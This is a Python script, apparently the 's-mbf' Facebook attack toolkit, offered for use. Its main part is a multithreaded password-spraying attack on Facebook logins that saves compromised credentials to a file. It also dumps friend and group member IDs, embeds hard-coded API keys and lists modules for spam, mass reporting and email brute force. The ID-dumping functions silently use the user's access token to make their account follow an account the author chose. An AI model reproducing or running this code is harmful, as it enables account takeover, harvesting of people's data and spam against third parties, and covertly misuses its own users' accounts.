#!usr/bin/python3.7
#Author: KANG-NEWBIE
#contact: t.me/kang_nuubi
#github: github.com/kang-newbie
try:
	from multiprocessing.pool import ThreadPool
	import os, requests, sys, json, time, hashlib, random, shutil
except Exception as F:
	exit("[ModuleErr] %s"%(F))

if sys.version[0] in '2':
	exit("[sorry] use python version 3")

#remove cache
try:
	shutil.rmtree("src/__pycache__")
except: pass

#color
r="\033[91m"
g="\033[92m"
w="\033[97m"
c="\033[96m"
y="\033[93m"
#banner
banner=("""%s
   _____ __  ______  ____
  / __(_)  |/  / _ )/ __/ %sAuthor : KANG-NEWBIE%s
 _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
/___/_/_/  /_/____/_/     %sversion: %s1.3%s"""%(c,g,c,g,c,g,c,w))

try:
	toket=open('toket/token.txt')
	toket.close()
except IOError:
		try:
			os.system('clear')

			print(banner)
			try:
				os.mkdir('toket')
			except OSError: pass
			print('[!] login to your facebook account first');id = input('[?] Username : ');pwd = input('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
			x = hashlib.new('md5')
			x.update(sig)
			data.update({'sig':x.hexdigest()})
			requ=requests.get('https://api.facebook.com/restserver.php',params=data,headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'})
			res=requ.json()['access_token']
			o=open('toket/token.txt','w')
			o.write(res)
			print("[!] success generate access token")
			print("[!] access token saved: toket/token.txt")
			time.sleep(3)
			o.close()
		except KeyError:
			print("[!] failed generate access token")
			print("[!] Check your username/password")
			exit()
		except (KeyboardInterrupt,EOFError):
			exit("\n[!] Key interrupt: exit.")
		except Exception as F:
			exit("[Error] %s"%(F))

def getFid():
	print(banner)
	try:
		os.mkdir('dump')
	except OSError: pass
	try:
		id=input("\n[in] your friends id: ")
		b=open('dump/friends_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(toket));requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
		s=json.loads(re.text)
		for i in s['friends']['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved	'%(i['id']), end=''),;sys.stdout.flush();time.sleep(0.0001)
		print('\n[!] all friends id successfuly retreived')
		print("[!] file saved: dump/friends_%s_id.txt"%(id))
		b.close()
		exit()
	except (KeyboardInterrupt,EOFError):
		exit("[!] Key interrupt: Stoped.")
	except KeyError:
		os.remove('dump/friends_'+str(id)+'_id.txt')
		exit('[!] failed to fetch friend id')

def getGid():
	print(banner)
	try:
		os.mkdir('dump')
	except OSError: pass
	try:
		id=input("\n[in] your groups id: ")
		b=open('dump/group_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id&limit=999999999&access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
		s=json.loads(re.text)
		for i in s['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved	'%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.0001)
		print('\n[!] group members id successfuly retreived')
		print("[!] file saved: dump/group_%s_id.txt"%(id))
		b.close()
		exit()
	except (KeyboardInterrupt,EOFError):
		exit("[!] Key interrupt: Stoped.")
	except KeyError:
		os.remove('dump/group_'+str(id)+'_id.txt')
		exit('[!] failed to fetch group id')

def rmtoken():
	print("""
1. remove access token
2. remove cookies
""")
	pilihan=int(input("/kang-newbie_> "))
	if pilihan == 1:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			os.remove('toket/token.txt')
			exit("[!] success removed access token")
		else: exit("[!] wrong input: exit")
	elif pilihan == 2:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			try:
				os.remove('toket/kue.txt')
			except FileNotFoundError: exit("[?] cookies not found")
			exit("[!] success removed cookies")
		else: exit("[!] wrong input: exit")
	else: exit("[exit] wrong input")

def update():
	print("[!] updating...")
	os.system('cd;rm -rf s-mbf')
	os.system('cd;git clone https://github.com/KANG-NEWBIE/s-mbf')
	exit()

cek=[]
tap=[]
def main(arg):
        try:
                url='https://mbasic.facebook.com/login'
                dt={'email':arg,'pass':pas,'login':'submit'}
                head={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
                req=requests.post(url,data=dt,headers=head)
                respData = req.content
                if 'save-device' in str(respData) or 'm_sess' in str(respData):
                        true='yeah'
                        live="%s|%s"%(arg,pas)
                        tap.append(true)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        tulis="{}\n".format(live)
                        f=open('result/found.txt','a')
                        f.write(tulis)
                        f.close()
                elif 'checkpoint' in str(respData):
                        true='notbad'
                        cek.append(true)
                        CP="%s|%s"%(arg,pas)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        wrt="{}\n".format(CP)
                        f=open('result/cek.txt','a')
                        f.write(wrt)
                        f.close()
                print("\r%s[%scrack%s]%s >>  %s  F[%s] CP[%s] << "%(c,r,c,w,arg,len(tap),len(cek)),end=''),;sys.stdout.flush()
        except: pass

os.system('clear')
print(banner)
try:
	toket=open('toket/token.txt','r').read()
	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
	name=nam.json()['name']
except KeyError:
	print("\n[Warning] access token invalid. type '4' to remove access token")
except requests.exceptions.RequestException:
	exit("\n[Err] Check your internet connection")
try:
	print("""\t[ Welcome %s%s%s ]

[01]> Simple multi bruteforce facebook
[02]> Dump id from your friends
[03]> Dump id from your group
[04]> Remove access token/cookies
[05]> Facebook home comments
[06]> Mass group comment
[07]> Auto comments target
[08]> Auto react comments target
[09]> Accept all friends requests
[10]> Auto add friends from target id
[11]> Facebook auto unfriends
[12]> Mass auto reactions
[13]> Mass auto follow
[14]> Facebook chat spammer
[15]> Auto posting status
[16]> Mass Auto Report
[17]> Facebook dump email
[18]> Multi bruteforce EMAIL (BETA)
[00]> Check update"""%(y,name,w))
except (KeyError,NameError): pass

pilih=int(input('\n[#] kang-newbie/> '))
if pilih == 2:
	os.system('clear')
	getFid()
elif pilih == 3:
	os.system('clear')
	getGid()
elif pilih == 4:
	rmtoken()
elif pilih == 5:
	import src.komen
	exit()
elif pilih == 6:
	import src.Gkomen
	exit()
elif pilih == 7:
	import src.Tkomen
	exit()
elif pilih == 8:
	import src.Kreact
	exit()
elif pilih == 9:
	import src.Facc
	exit()
elif pilih == 10:
	import src.Fadd
	exit()
elif pilih == 11:
	import src.Unf
	exit()
elif pilih == 12:
	input("[info] before use this module you must have a lot accounts [press enter to continue]")
	import src.Mreact
	exit()
elif pilih == 13:
	input("[Info] before use this module you must have a lot accounts [press enter]")
	import src.Asubs
	exit()
elif pilih == 14:
	import src.Cspam
	exit()
elif pilih == 15:
	import src.Apost
	exit()
elif pilih == 16:
	import src.Mreport
	exit()
elif pilih == 17:
	import src.Edump
	exit()
elif pilih == 18:
	import src.Ebrute
	exit()
elif pilih == 0:
	print("\n[!] Checking update")
	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
	if 'v.1.4' in str(rr):
		update()
	else: exit("[!] already up to date")
else:
	os.system('clear')
	print(banner)

try:
        file=open(input("\n[in] Id List Target: ")).read().splitlines()
        pas=input("[in] Password to Crack: ")
except (KeyboardInterrupt,EOFError):
        exit("%s\n[!] Key interrupt: Exiting."%(r))
except FileNotFoundError:
        exit("%s\n[!] File not found: Exiting."%(r))

o=[]
for x in file:
    o.append(x)
print('\n%s[ Cracking %s%s%s Account With Password %s%s%s ]'%(c,g,len(o),c,y,pas,c))
p=ThreadPool(50)
next=p.map(main,o)

if len(file) == 0:
	exit("%s[!] File empty\n"%(r))
if 'yeah' in str(tap) or 'notbad' in str(cek):
        print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
else: print("\n[ %s:(%s ] nothing found"%(y,w))
if len(tap) > 0:
	print("found result saved: result/found.txt")
if len(cek) > 0:
	print("check result saved: result/cek.txt")
